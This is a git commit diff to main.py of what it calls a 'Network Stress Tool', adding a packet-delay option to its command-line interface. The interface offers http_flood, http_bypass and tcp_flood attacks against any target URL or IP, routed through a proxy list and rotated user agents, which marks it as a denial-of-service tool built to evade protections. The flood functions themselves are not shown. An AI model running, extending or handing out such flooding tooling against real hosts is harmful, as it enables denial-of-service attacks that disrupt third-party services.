917ff91c41577e5585987ab4438eef37389f9446
Sakuzuna <nikita.kopychev@s.wingateschool.com>
2025-02-26 00:35:31 +0000

    Update main.py

--- main.py
+++ main.py
@@ -27,23 +27,24 @@ def load_user_agents(file_path):
 
 def main():
     print(Colorate.Horizontal(Colors.blue_to_white, (sharkprint)))
-    print("Example use: python main.py http://example.com --attack http_flood --duration 60 --packet-size 128")
     parser = argparse.ArgumentParser(description="Network Stress Tool")
     parser.add_argument("target", help="Target URL or IP:Port")
     parser.add_argument("--attack", choices=["http_flood", "http_bypass", "tcp_flood"], required=True, help="Type of attack")
     parser.add_argument("--duration", type=int, default=60, help="Duration of attack in seconds")
     parser.add_argument("--packet-size", type=int, default=64, help="Packet size in KB (default: 64)")
+    parser.add_argument("--packet-delay", type=int, default=100, help="Delay between packets in milliseconds (default: 100)")
     args = parser.parse_args()
 
     proxies = load_proxies("data/proxies.txt")
     user_agents = load_user_agents("data/uas.txt")
 
     if args.attack == "http_flood":
-        http_flood_attack(args.target, proxies, user_agents, args.duration, args.packet_size)
+        http_flood_attack(args.target, proxies, user_agents, args.duration, args.packet_size, args.packet_delay)
     elif args.attack == "http_bypass":
-        http_bypass_attack(args.target, proxies, user_agents, args.duration, args.packet_size)
+        http_bypass_attack(args.target, proxies, user_agents, args.duration, args.packet_size, args.packet_delay)
     elif args.attack == "tcp_flood":
-        tcp_flood_attack(args.target, proxies, args.duration, args.packet_size)
+        tcp_flood_attack(args.target, proxies, args.duration, args.packet_size, args.packet_delay)
 
 if __name__ == "__main__":
     main()
+    print("python main.py http://example.com --attack http_flood --duration 60 --packet-size 128 --packet-delay 200")
